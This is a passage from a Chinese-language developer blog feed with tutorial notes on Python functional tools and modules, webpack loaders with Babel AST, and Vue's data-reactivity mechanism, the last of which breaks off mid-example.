class="line">list(r)</span><br></pre></td></tr></table></figure><blockquote><p>reduce</p></blockquote><p>reduce把结果继续和序列的下一个元素做累积计算，其效果就是:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">reduce(f, [x1, x2, x3, x4]) = f(f(f(x1, x2), x3), x4)</span><br></pre></td></tr></table></figure><p>例如序列求和:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">from functools import reduce</span><br><span class="line">def add(x, y):</span><br><span class="line">    return x + y</span><br><span class="line"></span><br><span class="line">reduce(add, [1, 3, 5, 7, 9])</span><br></pre></td></tr></table></figure><blockquote><p>filter</p></blockquote><p><code>filter()</code>函数用于过滤序列,和<code>map()</code>类似，<code>filter()</code>也接收一个函数和一个序列。和<code>map()</code>不同的是，<code>filter()</code>把传入的函数依次作用于每个元素，然后根据返回值是<code>True</code>还是<code>False</code>决定保留还是丢弃该元素。</p><p>例如删掉偶数，只保留奇数：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">def is_odd(n):</span><br><span class="line">    return n % 2 == 1</span><br><span class="line"></span><br><span class="line">list(filter(is_odd, [1, 2, 4, 5, 6, 9, 10, 15]))</span><br><span class="line"># 结果: [1, 5, 9, 15]</span><br></pre></td></tr></table></figure><blockquote><p>sorted</p></blockquote><p>排序也是在程序中经常用到的算法。无论使用冒泡排序还是快速排序，排序的核心是比较两个元素的大小。如果是数字，我们可以直接比较，但如果是字符串或者两个dict呢？直接比较数学上的大小是没有意义的，因此，比较的过程必须通过函数抽象出来。</p><ul><li><code>sorted()</code>函数也是一个高阶函数，<ul><li>还可以接收一个key函数来实现自定义的排序，例如: <ul><li>按绝对值大小排序<br><code>sorted([36, 5, -12, 9, -21], key=abs)</code></li></ul></li></ul></li><li>默认情况下，对字符串排序，是按照ASCII的大小比较的</li><li>忽略大小写<ul><li><code>sorted([&#39;bob&#39;, &#39;about&#39;, &#39;Zoo&#39;, &#39;Credit&#39;], key=str.lower)</code></li></ul></li><li>反向排序，传入<code>reverse=True</code></li></ul><h3 id="装饰器"><a href="#装饰器" class="headerlink" title="装饰器"></a>装饰器</h3><blockquote><p>假设我们要增强一个函数的功能，比如，在函数调用前后自动打印日志，但又不希望修改这个函数的定义，这种在代码运行期间动态增加功能的方式，称之为“装饰器”（<code>Decorator</code>）</p></blockquote><p>decorator就是一个返回函数的高阶函数。所以，我们要定义一个能打印日志的decorator，可以定义如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">def log(func):</span><br><span class="line">    def wrapper(*args, **kw):</span><br><span class="line">        print(&apos;call %s():&apos; % func.__name__)</span><br><span class="line">        return func(*args, **kw)</span><br><span class="line">    return wrapper</span><br></pre></td></tr></table></figure><blockquote><p>使用装饰器</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">@log</span><br><span class="line">def now():</span><br><span class="line">    print(&apos;2015-3-25&apos;)</span><br></pre></td></tr></table></figure><p>把@log放到now()函数的定义处，相当于执行了语句：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">now = log(now)</span><br></pre></td></tr></table></figure><ul><li>函数拥有<code>__name__</code>属性，通过这个属性可以查看到函数的名称</li></ul><blockquote><p>decorator本身需要传入参数，那就需要编写一个返回decorator的高阶函数</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">def log(text):</span><br><span class="line">    def decorator(func):</span><br><span class="line">        def wrapper(*args, **kw):</span><br><span class="line">            print(&apos;%s %s():&apos; % (text, func.__name__))</span><br><span class="line">            return func(*args, **kw)</span><br><span class="line">        return wrapper</span><br><span class="line">    return decorator</span><br></pre></td></tr></table></figure><p>decorator用法如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">@log(&apos;execute&apos;)</span><br><span class="line">def now():</span><br><span class="line">    print(&apos;2015-3-25&apos;)</span><br></pre></td></tr></table></figure><p>携带参数的装饰器是这样的:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">now = log(&apos;execute&apos;)(now)</span><br></pre></td></tr></table></figure><p>但是通过自定义装饰器的包装，<code>__name__</code>属性的值已经变成了<code>wrapper</code>,Python内置的<code>functools.wraps</code>就是用来解决这个问题的。</p><p>参数的decorator:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">import functools</span><br><span class="line"></span><br><span class="line">def log(text):</span><br><span class="line">    def decorator(func):</span><br><span class="line">        @functools.wraps(func)</span><br><span class="line">        def wrapper(*args, **kw):</span><br><span class="line">            tprint(&apos;%s %s():&apos; % (text, func.__name__))</span><br><span class="line">            return func(*args, **kw)</span><br><span class="line">        return wrapper</span><br><span class="line">    return decorator</span><br></pre></td></tr></table></figure><h3 id="偏函数"><a href="#偏函数" class="headerlink" title="偏函数"></a>偏函数</h3><p>偏函数在Python中的定义是：把一个函数的某些参数给固定住（也就是设置默认值），返回一个新的函数，调用这个新函数会更简单</p><p>可以通过<code>functools.partial</code>创建偏函数</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">int2 = functools.partial(int, base=2)</span><br></pre></td></tr></table></figure><h2 id="迭代"><a href="#迭代" class="headerlink" title="迭代"></a>迭代</h2><p>在Python中，迭代是通过<code>for ... in</code>来完成的</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">d = &#123;&apos;a&apos;: 1, &apos;b&apos;: 2, &apos;c&apos;: 3&#125;</span><br></pre></td></tr></table></figure><blockquote><p>迭代dict</p></blockquote><p><code>dict</code>迭代的是<code>key</code>。如果要迭代<code>value</code>，可以用<code>for value in d.values()</code>，如果要同时迭代<code>key</code>和<code>value</code>，可以用<code>for k, v in d.items()</code>。</p><blockquote><p>判断对象是否是可迭代项目</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">from collections import Iterable</span><br><span class="line">isinstance(&apos;abc&apos;, Iterable) # str是否可迭代</span><br><span class="line">True</span><br></pre></td></tr></table></figure><h2 id="模块"><a href="#模块" class="headerlink" title="模块"></a>模块</h2><p>模块内容组成，以下面代码为例:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/env python3</span><br><span class="line"># -*- coding: utf-8 -*-</span><br><span class="line"></span><br><span class="line">&apos; a test module &apos;</span><br><span class="line"></span><br><span class="line">__author__ = &apos;Michael Liao&apos;</span><br><span class="line"></span><br><span class="line">import sys</span><br><span class="line"></span><br><span class="line">def test():</span><br><span class="line">    print(&apos;hello!&apos;)</span><br><span class="line"></span><br><span class="line">if __name__==&apos;__main__&apos;:</span><br><span class="line">    test()</span><br></pre></td></tr></table></figure><ul><li>第1行注释可以让这个<code>*.py</code>文件直接在<code>Unix/Linux/Mac</code>上运行</li><li>第2行注释表示<code>.py</code>文件本身使用标准UTF-8编码</li><li>第4行是一个字符串，表示模块的文档注释，任何模块代码的第一个字符串都被视为模块的文档注释</li><li>第6行使用<code>__author__</code>变量把作者写进去</li></ul><blockquote><p>导入模块</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">import sys</span><br></pre></td></tr></table></figure><p>导入<code>sys</code>模块后，我们就有了变量<code>sys</code>指向该模块，利用<code>sys</code>这个变量，就可以访问<code>sys</code>模块的所有功能</p><ul><li><code>sys</code>模块有一个<code>argv</code>变量，用<code>list</code>存储了命令行的所有参数<ul><li>运行<code>python3 hello.py Michael</code>获得的<code>sys.argv</code>就是<code>[&#39;hello.py&#39;, &#39;Michael]</code></li></ul></li></ul><h3 id="作用域"><a href="#作用域" class="headerlink" title="作用域"></a>作用域</h3><p>模块内的私有变量和函数我们通过<code>_</code>来实现，类似<code>_xxx</code>和<code>__xxx</code>这样的函数或变量就是非公开的（<code>private</code>），不应该被直接引用，比如<code>_abc</code>，<code>__abc</code>等</p><p>private函数和变量“不应该”被直接引用，而不是“不能”被直接引用，是因为Python并没有一种方法可以完全限制访问private函数或变量，但是，从编程习惯上不应该引用private函数或变量。</p><h3 id="安装python包"><a href="#安装python包" class="headerlink" title="安装python包"></a>安装python包</h3><p>一般来说，第三方库都会在Python官方的pypi.python.org网站注册，要安装一个第三方库，必须先知道该库的名称，可以在官网或者pypi上搜索，比如Pillow的名称叫Pillow，因此，安装Pillow的命令就是：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip install Pillow</span><br></pre></td></tr></table></figure><blockquote><p>模块搜索路径</p></blockquote><p>当我们试图加载一个模块时，Python会在指定的路径下搜索对应的.py文件，如果找不到，就会报错</p><p>默认情况下，Python解释器会搜索当前目录、所有已安装的内置模块和第三方模块，搜索路径存放在sys模块的path变量中:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">import sys</span><br><span class="line">sys.path</span><br><span class="line">[&apos;&apos;, &apos;/Library/Frameworks/Python.framework/Versions/3.6/lib/python36.zip&apos;, &apos;/Library/Frameworks/Python.framework/Versions/3.6/lib/python3.6&apos;, ..., &apos;/Library/Frameworks/Python.framework/Versions/3.6/lib/python3.6/site-packages&apos;]</span><br></pre></td></tr></table></figure><blockquote><p>添加自己的搜索目录</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">import sys</span><br><span class="line">sys.path.append(&apos;/Users/michael/my_py_scripts&apos;)</span><br></pre></td></tr></table></figure><h2 id="安装版本"><a href="#安装版本" class="headerlink" title="安装版本"></a>安装版本</h2><blockquote><p>问题</p></blockquote><p>如电脑上同时装了python2(2.7)和python3(3.5)，当使用pip安装时默认应安装到python2中，pip3安装时应安装到python3中，但奇怪的是使用pip安装时每次都定位到python3中，不知是啥原因，也不知如何将其重定向到python2中，索性手动指定pip到python2中</p><blockquote><p>查看pip版本</p></blockquote><p>pip -V pip 18.0 from /usr/local/lib/python3.5/dist-packages/pip (python 3.5)<br>pip2 -V pip 8.1.1 from /usr/lib/python2.7/dist-packages (python 2.7)<br>pip3 -V pip 18.0 from /usr/local/lib/python3.5/dist-packages/pip (python 3.5)</p><blockquote><p>pip指定python版本安装</p></blockquote><p>安装到python2.7版本中：sudo pip2 install 模块名 或 python2 -m pip install 模块名<br>安装到python3.5版本中：sudo pip3 install 模块名 或 python3 -m pip install 模块名</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;基础&quot;&gt;&lt;a href=&quot;#基础&quot; class=&quot;headerlink&quot; title=&quot;基础&quot;&gt;&lt;/a&gt;基础&lt;/h1&gt;&lt;p&gt;本文是Python的笔记，&lt;a href=&quot;https://www.liaoxuefeng.com/wiki/101695966360240
      
    
    </summary>
    
      <category term="python" scheme="http://zhoushaw.github.io/categories/python/"/>
    
    
      <category term="python" scheme="http://zhoushaw.github.io/tags/python/"/>
    
  </entry>
  
  <entry>
    <title>loader入门</title>
    <link href="http://zhoushaw.github.io/2019/07/29/learning/font-end/js/loader/"/>
    <id>http://zhoushaw.github.io/2019/07/29/learning/font-end/js/loader/</id>
    <published>2019-07-28T20:17:35.000Z</published>
    <updated>2019-09-05T13:11:36.230Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>Loader 就像是一个翻译员，能把源文件经过转化后输出新的结果，并且一个文件还可以链式的经过多个翻译员翻译。</p><p>可以通过loader对源码进行解析编译，生成新的代码，例如babel-loader，就是对源码进行编译解析将es6转换成es5代码</p><blockquote><p>Loader 基础</p></blockquote><p>由于 Webpack 是运行在 Node.js 之上的，一个 Loader 其实就是一个 Node.js 模块，这个模块需要导出一个函数。 这个导出的函数的工作就是获得处理前的原内容，对原内容执行处理后，返回处理后的内容。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">module.exports = function(source) &#123;</span><br><span class="line">  // source 为 compiler 传递给 Loader 的一个文件的原内容</span><br><span class="line">  // 该函数需要返回处理后的内容，这里简单起见，直接把原内容返回了，相当于该 Loader 没有做任何转换</span><br><span class="line">  return source;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h2 id="关于学习AST转换的一些文档"><a href="#关于学习AST转换的一些文档" class="headerlink" title="关于学习AST转换的一些文档"></a>关于学习AST转换的一些文档</h2><ul><li><a href="https://github.com/jamiebuilds/babel-handbook/blob/master/translations/en/user-handbook.md" target="_blank" rel="noopener">babel-handbook</a></li><li><a href="https://babeljs.io/docs/en/babel-types#functionexpression" target="_blank" rel="noopener">babel-types</a></li><li><a href="https://astexplorer.net/" target="_blank" rel="noopener">ast-explorer</a></li><li><a href="https://github.com/jamiebuilds/babel-handbook/blob/master/translations/en/plugin-handbook.md" target="_blank" rel="noopener">Babylon-AST初探-代码生成</a></li></ul><h2 id="Babel-的处理步骤"><a href="#Babel-的处理步骤" class="headerlink" title="Babel 的处理步骤"></a>Babel 的处理步骤</h2><p>Babel 的三个主要处理步骤分别是：</p><ul><li><code>解析（parse）</code></li><li><code>转换（transform）</code></li><li><code>生成（generate）</code></li></ul><blockquote><p>解析</p></blockquote><p>解析步骤接收代码并输出 AST。 这个步骤分为两个阶段：<strong>词法分析（Lexical Analysis） </strong>和 语法分析（Syntactic Analysis）。</p><blockquote><p>转换</p></blockquote><p>转换步骤接收 AST 并对其进行遍历，在此过程中对节点进行添加、更新及移除等操作</p><blockquote><p>生成</p></blockquote><p>代码生成步骤把最终（经过一系列转换之后）的 AST 转换成字符串形式的代码，同时还会创建源码映射（source maps）</p><h3 id="解析"><a href="#解析" class="headerlink" title="解析"></a>解析</h3><p>在进行代码转换前，需要将代码转换成AST语法，可以通过<code>babel</code>提供的<code>parser</code>工具进行转换，具体转换成ast代码如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">// 安装依赖 npm install @babel/parser</span><br><span class="line">const parser = require(&quot;@babel/parser&quot;);</span><br><span class="line">// 其中code为提供的源码</span><br><span class="line">let code = `</span><br><span class="line">    function testFn() &#123;</span><br><span class="line">    </span><br><span class="line">    &#125;</span><br><span class="line">`;</span><br><span class="line">const ast = parser.parse(code);</span><br></pre></td></tr></table></figure><h2 id="转换"><a href="#转换" class="headerlink" title="转换"></a>转换</h2><blockquote><p>遍历</p></blockquote><p>要进行代码转换必须对AST进行遍历，它遍历的顺序是按照<strong>树的深度遍历</strong>进行</p><p><img src="https://s10.mogucdn.com/mlcdn/c45406/190821_1736cgd1g5khfa8a4dfj11k7cebf7_440x376.png" alt=""></p><p>详细遍历过程可参考：<a href="https://github.com/jamiebuilds/babel-handbook/blob/master/translations/zh-Hans/plugin-handbook.md#%E9%81%8D%E5%8E%86" target="_blank" rel="noopener">traverse遍历规则</a></p><blockquote><p>如何通过babel访问并修改ast节点</p></blockquote><p>我们可以通过<code>@babel/parser</code>npm包对ast进行访问，具体实现代码如下:</p><h2 id="从零开发一个loader"><a href="#从零开发一个loader" class="headerlink" title="从零开发一个loader"></a>从零开发一个loader</h2><p>###利用 loader-runner 调试 Loaders</p><p><a href="https://www.npmjs.com/package/loader-runner" target="_blank" rel="noopener">loader-runner</a> 允许你不依靠 webpack 单独运行 loader</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">mkdir loader-example &amp;&amp; cd $_</span><br><span class="line">touch index.js  // 创建需要转换的数据源</span><br><span class="line">npm init</span><br><span class="line">npm install loader-runner --save-dev</span><br></pre></td></tr></table></figure><blockquote><p>创建运行loader文件</p></blockquote><ul><li>step1</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">touch run-loader.js</span><br></pre></td></tr></table></figure><ul><li>step2</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">//run-loader.js</span><br><span class="line">const fs = require(&quot;fs&quot;);</span><br><span class="line">const path = require(&quot;path&quot;);</span><br><span class="line">const &#123; runLoaders &#125; = require(&quot;loader-runner&quot;);</span><br><span class="line"></span><br><span class="line">runLoaders(</span><br><span class="line">  &#123;</span><br><span class="line">    resource: &quot;./index.js&quot;, // 转换源</span><br><span class="line">    loaders: [path.resolve(__dirname, &quot;./loader-demo.js&quot;)], // loader地址</span><br><span class="line">    readResource: fs.readFile.bind(fs),</span><br><span class="line">  &#125;,</span><br><span class="line">  // 第二个参数，是一个函数形参是错误、转换结果</span><br><span class="line">  (err, result) =&gt; &#123;</span><br><span class="line">    if (err) &#123;</span><br><span class="line">        console.error(err)</span><br><span class="line">        return;</span><br><span class="line">    &#125; </span><br><span class="line">    //输出转换结果到output.js中</span><br><span class="line">    fs.writeFileSync(&quot;./output.js&quot;, result.result)</span><br><span class="line">  &#125;</span><br><span class="line">);</span><br></pre></td></tr></table></figure><blockquote><p>创建loader</p></blockquote><ul><li>step1</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">touch loader-demo.js</span><br></pre></td></tr></table></figure><ul><li>step2</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">module.exports = function(source) &#123;</span><br><span class="line">  // ... 对source进行转换</span><br><span class="line">  return source;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h2 id="通过AST对代码进行改造"><a href="#通过AST对代码进行改造" class="headerlink" title="通过AST对代码进行改造"></a>通过AST对代码进行改造</h2><p><code>抽象语法树是源代码语法结构的一种抽象表示。它以树状的形式表现编程语言的语法结构，树上的每个节点都表示源代码中的一种结构</code></p><blockquote><p>功能</p></blockquote><p>通过 AST 可以实现很多非常有用的功能，例如将 ES6 以后的代码转为 ES5，eslint 的检查，代码美化，甚至 js 引擎都是依赖 AST 实现的，同时因为代码本质只是单纯的字符串，所以并不仅限于 js 之间的转换，scss，less 等 css 预处理器也是通过 AST 转为浏览器认识的 css 代码</p><blockquote><p>起步</p></blockquote><ul><li>step1</li></ul><p><code>npm install @babel/parser @babel/traverse @babel/types @babel/core --save-dev</code></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;Loader 就像是一个翻译员，能把源文件经过转化后输出新的结果，并且一个文件还可以链式的经过多个翻译员翻译。&lt;/p&gt;
&lt;p&gt;可以通过loa
      
    
    </summary>
    
      <category term="js" scheme="http://zhoushaw.github.io/categories/js/"/>
    
    
      <category term="js" scheme="http://zhoushaw.github.io/tags/js/"/>
    
  </entry>
  
  <entry>
    <title>戴尔卡耐基-人性的弱点</title>
    <link href="http://zhoushaw.github.io/2019/07/18/other/life/%E4%BA%BA%E6%80%A7%E7%9A%84%E5%BC%B1%E7%82%B9/"/>
    <id>http://zhoushaw.github.io/2019/07/18/other/life/人性的弱点/</id>
    <published>2019-07-18T03:39:35.000Z</published>
    <updated>2019-08-08T12:02:30.112Z</updated>
    
    <content type="html"><![CDATA[<div><a id="more"></a></div>]]></content>
    
    <summary type="html">
    
      &lt;div&gt;
    
    </summary>
    
      <category term="life" scheme="http://zhoushaw.github.io/categories/life/"/>
    
    
      <category term="life" scheme="http://zhoushaw.github.io/tags/life/"/>
    
  </entry>
  
  <entry>
    <title>vue技术内幕-数据响应系统</title>
    <link href="http://zhoushaw.github.io/2019/06/17/learning/font-end/vue/vue-data-reactive/"/>
    <id>http://zhoushaw.github.io/2019/06/17/learning/font-end/vue/vue-data-reactive/</id>
    <published>2019-06-17T13:21:35.000Z</published>
    <updated>2019-06-25T14:27:56.241Z</updated>
    
    <content type="html"><![CDATA[<h2 id="数据响应系统的基本思路"><a href="#数据响应系统的基本思路" class="headerlink" title="数据响应系统的基本思路"></a>数据响应系统的基本思路</h2><p>我们都知道在<code>Vue</code>中存在<code>watch</code>(观察者)。通过设置<code>watch</code>可以对数据进行观察，当数据发生变化时，可以执行对应的观察函数，下面为例：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">var ins = new Vue(&#123;</span><br><span class="line">    data () &#123;</span><br><span class="line">        return &#123;</span><br><span class="line">            name: &apos;shaw&apos;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;)</span><br><span class="line">ins.$watch(&apos;name&apos;, ()=&gt;&#123;</span><br><span class="line">    console.log(&apos;name数据发生修改&apos;);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>在这个例子中，当我们使用<code>ins.name=&#39;zhou shaw&#39;</code>进行修改数据时，控制台会输出<code>name数据发生修改</code>,现在我们将功能抽象出来：</p><blockquote><p>假设我们有一个数据data</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">const data = &#123;</span><br><span class="line">    name: &apos;shaw&apos;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><blockquote><p>函数$watch,接收两个参数(要观测的key，回调函数)</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$watch(key,()=&gt;&#123;...&#125;)</span><br></pre></td></tr></table></figure><blockquote><p>实现的抽象功能</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">const data = &#123;</span><br><span class="line">    name: &apos;shaw&apos;</span><br><span class="line">&#125;;</span><br><span class="line">$watch(&apos;name&apos;,()=&gt;&#123;</span><br><span class="line">    console.log(&apos;name 值发生更改&apos;);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">data.name = &apos;zhou shaw&apos;;</span><br><span class="line"># log： name 值发生更改</span><br></pre></td></tr></table></figure><p>我们通过<code>$watch</code>函数来添加<code>data</code>对象数据的依赖关系，若<code>data</code>中的数据发生改变时出发对应<code>watch</code>函数。实现这样一个功能说复杂也复杂说简单也简单，说复杂是因为我们需要考虑到很多便捷情况、如重复依赖、深度观测，以及如何处理数组等多种情况。我们暂且不考虑这些边界情况，来实现一个简单的响应式系统。</p><p>首先我们需要面临的第一个问题就是，如何检测数据发生了变化，我们可以通过<code>Object.defineProperty</code>来对属性进行检测：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">const data = &#123;</span><br><span class="line">    name: &apos;shaw&apos;</span><br><span class="line">&#125;;</span><br><span class="line">Object.defineProperty(data,&apos;name&apos;, &#123;</span><br><span class="line">    set (newValue) &#123;</span><br><span class="line">        console.log(&apos;name 值发生更改&apos;);</span><br><span class="line">    &#125;,</span><br><span class="line">    get () &#123;</span><br><span class="line">        console.log(&apos;读取了属性name&apos;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>通过<code>defineProperty</code>定义我们劫持了data对象的name属性操作，我们可以将劫持的方法封装至<code>watch</code>方法中，如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">const data = &#123;</span><br><span class="line">    name: &apos;shaw&apos;</span><br><span class="line">&#125;;</span><br><span class="line">$watch = function (key, fn) &#123;</span><br><span class="line">    Object.defineProperty(data,&apos;name&apos;, &#123;</span><br><span class="line">        set (newValue) &#123;</span><br><span class="line">            fn();</span><br><span class="line">        &#125;,</span><br><span class="line">        get () &#123;</span><br><span class="line">            console.log(&apos;读取了属性name&apos;);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>上面的代码已经简单实现了对数据的观测，但是大家不难发现其中存在的问题，上面例子中<code>set</code>函数并未设置属性新的赋值，并且<code>get</code>函数并未返回获取的值会导致属性的设置和获取失效。并且上面的例子，我们我无法对一个对象的属性收集多个依赖，并且我们每次调用<code>watch</code>都对属性重新定义了<code>set</code>和<code>get</code>,当属性还存在其他依赖时这样会覆盖原有的依赖，我们不妨展开🤔，<code>set</code>函数可以用于触发数据数据发生变化，我们可不可以通过<code>get</code>函数来进行依赖收集呢</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">var data = &#123;</span><br><span class="line">    name: &apos;shaw&apos;,</span><br><span class="line">    age: 23</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">let Target;</span><br><span class="line"></span><br><span class="line">let dep = [];</span><br><span class="line"></span><br><span class="line">let val = data[&apos;name&apos;];</span><br><span class="line">Object.defineProperty(data, &apos;name&apos;, &#123;</span><br><span class="line">    set(newValue) &#123;</span><br><span class="line">        // 设置新值与旧值相等，不进行依赖</span><br><span class="line">        if (val === newValue) return;</span><br><span class="line">        val = newValue</span><br><span class="line">        // 执行依赖</span><br><span class="line">        dep.forEach(fn =&gt; fn());</span><br><span class="line">    &#125;,</span><br><span class="line">    get() &#123;</span><br><span class="line">        // 有依赖进行收集</span><br><span class="line">        if (Target) dep.push(Target);</span><br><span class="line">        return val;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">$watch = function (key,fn) &#123;</span><br><span class="line">   